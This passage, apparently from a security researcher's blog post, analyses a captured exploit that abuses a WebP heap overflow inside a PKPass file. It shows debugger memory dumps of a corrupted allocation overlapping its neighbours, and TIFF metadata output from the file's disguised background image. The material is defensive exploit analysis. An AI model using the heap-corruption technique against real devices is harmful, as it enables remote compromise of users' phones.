 &lt;p class=&quot;XQFzMDWmii-c11&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x148000048: &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9 XQFzMDWmii-c15&quot;&gt;0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c11&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x148000058: &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c23 XQFzMDWmii-c15&quot;&gt;0x0007&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c23&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c23 XQFzMDWmii-c19&quot;&gt;0x0027&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9 XQFzMDWmii-c19&quot;&gt;&amp;nbsp;0x0000 0x0000&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9 XQFzMDWmii-c32&quot;&gt;0x0018 0x0000 0x0000 0x0000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c11&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x148000068: &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9 XQFzMDWmii-c32&quot;&gt;0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c11&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x148000078: &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9 XQFzMDWmii-c32&quot;&gt;0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c11&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x148000088: &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9 XQFzMDWmii-c32&quot;&gt;0x0000 0x0000 0x0000 0x0000&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9 XQFzMDWmii-c33&quot;&gt;0x0003 0x0000 0x0000&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9 XQFzMDWmii-c14&quot;&gt;0x001c&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c11&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x148000098: &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9 XQFzMDWmii-c14&quot;&gt;0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c11&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x1480000a8: &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9 XQFzMDWmii-c14&quot;&gt;0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c11&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x1480000b8: &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9 XQFzMDWmii-c14&quot;&gt;0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c11&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x1480000c8: &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9 XQFzMDWmii-c14&quot;&gt;0x0000 0x0000 0x0000&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9 XQFzMDWmii-c31&quot;&gt;0x001d 0x0000 0x0000 0x0000 0x0000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;It&amp;#39;s changed the size of an in-use allocation from &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;3&lt;/span&gt;&lt;span&gt;&amp;nbsp;blocks to &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;39&lt;/span&gt;&lt;span&gt;&amp;nbsp;(or from &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;1536&lt;/span&gt;&lt;span&gt;&amp;nbsp;to &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;19968&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;bytes). I mentioned before that the maximum size of an in-use allocation is meant to be 31 blocks, but this doesn&amp;#39;t seem to be checked in every single free path. If things don&amp;#39;t quite work out, you&amp;#39;ll hit a runtime check. But if things do work out you end up with a situation like this:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c11&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;(lldb) x/200wh 0x148000028&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c11&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x148000028: &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9 XQFzMDWmii-c15&quot;&gt;0x0019 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c11&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x148000038: &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9 XQFzMDWmii-c15&quot;&gt;0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c11&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x148000048: &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9 XQFzMDWmii-c15&quot;&gt;0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c11&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x148000058: &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c23 XQFzMDWmii-c15&quot;&gt;0x0007&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c23&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c13 XQFzMDWmii-c23 XQFzMDWmii-c19&quot;&gt;0x8027&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c13 XQFzMDWmii-c9 XQFzMDWmii-c19&quot;&gt;&amp;nbsp;0x0000 0x0000&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c13 XQFzMDWmii-c9&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c21 XQFzMDWmii-c13 XQFzMDWmii-c9 XQFzMDWmii-c32&quot;&gt;0x0018 0x0000 0x0000 0x0000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c11&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x148000068: &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c21 XQFzMDWmii-c13 XQFzMDWmii-c9 XQFzMDWmii-c32&quot;&gt;0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c11&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x148000078: &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c21 XQFzMDWmii-c13 XQFzMDWmii-c9 XQFzMDWmii-c32&quot;&gt;0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c11&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x148000088: &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c13 XQFzMDWmii-c9 XQFzMDWmii-c32&quot;&gt;0x0000 0x0000 0x0000 0x0000&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c13 XQFzMDWmii-c9&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c13 XQFzMDWmii-c9 XQFzMDWmii-c33&quot;&gt;0x0003 0x0000 0x0000&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c13 XQFzMDWmii-c9&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c21 XQFzMDWmii-c13 XQFzMDWmii-c9 XQFzMDWmii-c14&quot;&gt;0x001c&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c11&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x148000098: &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c13 XQFzMDWmii-c9 XQFzMDWmii-c14&quot;&gt;0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c21 XQFzMDWmii-c13 XQFzMDWmii-c23 XQFzMDWmii-c14&quot;&gt;0x8027&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c11&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x1480000a8: &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9 XQFzMDWmii-c14&quot;&gt;0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c11&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x1480000b8: &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9 XQFzMDWmii-c14&quot;&gt;0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c11&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x1480000c8: &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9 XQFzMDWmii-c14&quot;&gt;0x0000 0x0000 0x0000&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9 XQFzMDWmii-c31&quot;&gt;0x001d 0x0000 0x0000 0x0000 0x0000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;The yellow (&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x8027&lt;/span&gt;&lt;span&gt;) allocation now extends beyond its original three blocks and completely overlaps the following green (&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x18&lt;/span&gt;&lt;span&gt;) and blue (&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x3&lt;/span&gt;&lt;span&gt;) as well as the start of the purple (&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x1c&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;) allocation.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;But as soon as this corruption occurs WebP parsing fails and it&amp;#39;s not going to make any other allocations. So what are they doing? How are they able to leverage these overlapping allocations? I was pretty stumped.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;One theory was that perhaps it was some internal ImageIO or BlastDoor specific object which reallocated the overlapping memory. Another theory was that perhaps the exploit had two parts; this first part which puts overlapping entries on the allocator freelist, then another file which is sent to exploit that? And maybe I was lacking that file? But then, why would there be that huge 1MB payload with NSExpressions in it? That didn&amp;#39;t add up.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;XQFzMDWmii-c12&quot; id=&quot;h.swwxr4jh7qvs&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c18&quot;&gt;Puzzling pieces&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;As is so often the case, stepping back and not thinking about the problem for a while I realised that I&amp;#39;d completely overlooked and forgotten something critical. Right at the very start of the analysis I had run &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;file&lt;/span&gt;&lt;span&gt;&amp;nbsp;on all the files inside the PKPass and noted that &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;background.png&lt;/span&gt;&lt;span&gt;&amp;nbsp;was actually not a &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;png&lt;/span&gt;&lt;span&gt;&amp;nbsp;but a &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;TIFF&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;. I had then completely forgotten that. But now the solution seemed obvious: the reason to use a PKPass versus just a WebP is that the PKPass parser will render multiple images in sequence, and there must be something in the TIFF which reallocates the overlapping allocation with something useful.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;http://www.libtiff.org/&quot;&gt;Libtiff&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;comes with a suite of tools for parsing tiff files. &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;tiffdump&lt;/span&gt;&lt;span&gt;&amp;nbsp;displays the headers and &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;EXIF&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;tags:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;$ tiffdump background-15.tiff &lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;background-15.tiff:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;Magic: 0x4d4d &amp;lt;big-endian&amp;gt; Version: 0x2a &amp;lt;ClassicTIFF&amp;gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;Directory 0: offset 68 (0x44) next 0 (0)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;ImageWidth (256) SHORT (3) 1&amp;lt;48&amp;gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;ImageLength (257) SHORT (3) 1&amp;lt;16&amp;gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;BitsPerSample (258) SHORT (3) 4&amp;lt;8 8 8 8&amp;gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;Compression (259) SHORT (3) 1&amp;lt;8&amp;gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;Photometric (262) SHORT (3) 1&amp;lt;2&amp;gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;StripOffsets (273) LONG (4) 1&amp;lt;8&amp;gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;Orientation (274) SHORT (3) 1&amp;lt;1&amp;gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;SamplesPerPixel (277) SHORT (3) 1&amp;lt;4&amp;gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;StripByteCounts (279) LONG (4) 1&amp;lt;59&amp;gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;PlanarConfig (284) SHORT (3) 1&amp;lt;1&amp;gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;ExtraSamples (338) SHORT (3) 1&amp;lt;2&amp;gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;700 (0x2bc) BYTE (1) 15347&amp;lt;00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ...&amp;gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;33723 (0x83bb) UNDEFINED (7) 15347&amp;lt;00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ...&amp;gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;34377 (0x8649) BYTE (1) 15347&amp;lt;00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ...&amp;gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;ICC Profile (34675) UNDEFINED (7) 15347&amp;lt;00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ...&amp;gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;The presence of the four 15KB buffers is notable, but they seemed to mostly just be zeros. Here&amp;#39;s the output from &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;tiffinfo&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;$ tiffinfo -c -j -d -s -z background-15.tiff &lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;=== TIFF directory 0 ===&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;TIFF Directory at offset 0x44 (68)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;&amp;nbsp; Image Width: 48 Image Length: 16&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;&amp;nbsp; Bits/Sample: 8&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;&amp;nbsp; Compression Scheme: AdobeDeflate&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;&amp;nbsp; Photometric Interpretation: RGB color&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;&amp;nbsp; Extra Samples: 1&amp;lt;unassoc-alpha&amp;gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;&amp;nbsp; Orientation: row 0 top, col 0 lhs&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;&amp;nbsp; Samples/Pixel: 4&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;&amp;nbsp; Planar Configuration: single image plane&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;&amp;nbsp; XMLPacket (XMP Metadata):&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;&amp;nbsp; RichTIFFIPTC Data: &amp;lt;present&amp;gt;, 15347 bytes&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;&amp;nbsp; Photoshop Data: &amp;lt;present&amp;gt;, 15347 bytes&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;&amp;nbsp; ICC Profile: &amp;lt;present&amp;gt;, 15347 bytes&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;&amp;nbsp; 1 Strips:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; 0: [ &amp;nbsp; &amp;nbsp; &amp;nbsp; 8, &amp;nbsp; &amp;nbsp; &amp;nbsp; 59]&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;Strip 0:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;&amp;nbsp;00 00 00 00 00 00 00 00 84 13 00 00 01 00 00 00 01 00 00 00 00 00 00 00&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;&amp;nbsp;00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;&amp;nbsp;cd ab 34 12 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;&amp;nbsp;00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;&amp;nbsp;00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00&lt;/span&gt;&lt;/p&gt;
